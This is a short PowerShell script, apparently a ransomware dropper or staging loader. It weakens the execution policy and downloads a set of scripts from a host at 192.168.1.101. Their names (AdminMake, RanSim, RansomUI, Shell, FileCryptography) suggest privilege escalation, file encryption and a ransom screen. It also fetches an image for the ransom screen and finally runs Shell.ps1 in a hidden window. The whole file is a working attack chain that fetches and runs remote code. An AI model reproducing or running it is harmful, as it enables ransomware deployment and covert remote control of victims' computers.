Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine -Force

$AccPath = [Environment]::GetFolderPath("Favorites")
cd $AccPath

Invoke-WebRequest 'http://192.168.1.101:8000/AdminMake.ps1' -OutFile AdminMake.ps1
Invoke-WebRequest 'http://192.168.1.101:8000/AdminMakePre.ps1' -OutFile AdminMakePre.ps1
Invoke-WebRequest 'http://192.168.1.101:8000/RanSim.ps1' -OutFile RanSim.ps1
Invoke-WebRequest 'http://192.168.1.101:8000/RansomUI.ps1' -OutFile RansomUI.ps1
Invoke-WebRequest 'http://192.168.1.101:8000/Shell.ps1' -OutFile Shell.ps1
Invoke-WebRequest 'http://192.168.1.101:8000/Main.ps1' -OutFile Main.ps1

Invoke-WebRequest 'http://192.168.1.101:8000/FileCryptography.psm1' -OutFile FileCryptography.psm1

Invoke-WebRequest 'https://pbs.twimg.com/media/EF4HSNSWoAAOlvz.jpg:large' -OutFile UIImage.png

./Shell.ps1 -WindowStyle Hidden
